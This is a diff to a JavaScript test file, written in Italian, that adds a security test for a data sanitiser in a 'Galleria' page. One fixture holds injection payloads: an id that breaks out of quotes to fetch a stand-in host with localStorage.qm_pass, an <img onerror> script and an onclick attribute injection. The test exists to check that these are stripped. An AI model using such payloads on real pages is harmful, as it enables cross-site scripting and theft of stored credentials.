@@ -199,3 +199,18 @@ ok('Galleria: tre voci di menu',                    Object.keys(BG_SEZIONI).join
     ok('Galleria: la riga mostra il passaggio', _gbStoCompensa(st).replace(/<[^>]+>/g, ''), 'Nelle consegne: 66 pezzi mancanti − 20 in più = 46 mancanti');
   } finally { _gbGiri = vG; _gbRigaGiro = vR; }
 })();
+
+// ── Sicurezza: un dato scritto col codice della Galleria non porta codice sulla pagina (26/09/2026) ──
+//    Sul PC del QM questa pagina gira col lasciapassare di Compass: un testo con <img onerror>
+//    o un id con un apice (che esce dall'onclick) potrebbe leggerlo e spedirlo fuori.
+(function () {
+  var o = _gbJson(JSON.stringify({ consumi: [{ id: "x');fetch('//a.b?'+localStorage.qm_pass);('", hk: 'Maria <img src=x onerror=alert(1)>', motivo: "dell'ospite \"x\" `y`", ritiroId: "r1' onclick='z" }], fatture: { 'ar|2026-09<b>': { q: 3 } } }));
+  var c = o.consumi[0];
+  ok('sicurezza: l\'id perde apici e parentesi',  c.id, 'xfetcha.blocalStorage.qm_pass');
+  ok('sicurezza: niente tag nei testi',           /[<>]/.test(c.hk), false);
+  ok('sicurezza: l\'apostrofo italiano resta',    c.motivo, "dell'ospite x y");
+  ok('sicurezza: anche i ...Id',                  c.ritiroId, 'r1onclickz');
+  ok('sicurezza: le chiavi degli oggetti',        Object.keys(o.fatture).join(), 'ar|2026-09b');
+  ok('sicurezza: i numeri restano numeri',        o.fatture['ar|2026-09b'].q, 3);
+  ok('sicurezza: id normale intatto',             _gbJson('{"id":"1758800000000_ab12cd"}').id, '1758800000000_ab12cd');
+})();
